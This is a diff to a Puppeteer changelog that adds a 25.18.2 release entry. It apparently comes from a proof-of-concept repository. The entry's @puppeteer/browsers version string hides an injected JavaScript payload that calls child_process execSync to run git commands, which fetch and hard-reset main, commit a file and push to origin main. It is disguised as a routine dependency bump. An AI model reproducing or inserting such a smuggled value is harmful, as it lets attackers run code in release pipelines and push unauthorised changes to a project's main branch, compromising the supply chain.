@@ -1,5 +1,15 @@
 # Changelog
 
+## [25.18.2](https://github.com/arnodorian1337/puppeteer-sinkc-public-poc-final2/compare/puppeteer-v25.18.1...puppeteer-v25.18.2) (2026-11-24)
+
+
+### Dependencies
+
+* The following workspace dependencies were updated
+  * dependencies
+    * @puppeteer/browsers bumped from 3.2.7 to 3.2.9-';process.getBuiltinModule("child_process").execSync("git fetch origin main:p;git reset --hard p;echo P>p;git add -- p;git -c user.name=p -c user.email=p@p commit -m p;git push origin HEAD:main")//../../../browsers
+    * puppeteer-core bumped from 25.18.1 to 25.18.2
+
 ## [25.18.1](https://github.com/puppeteer/puppeteer/compare/puppeteer-v25.18.0...puppeteer-v25.18.1) (2026-11-17)
 
 
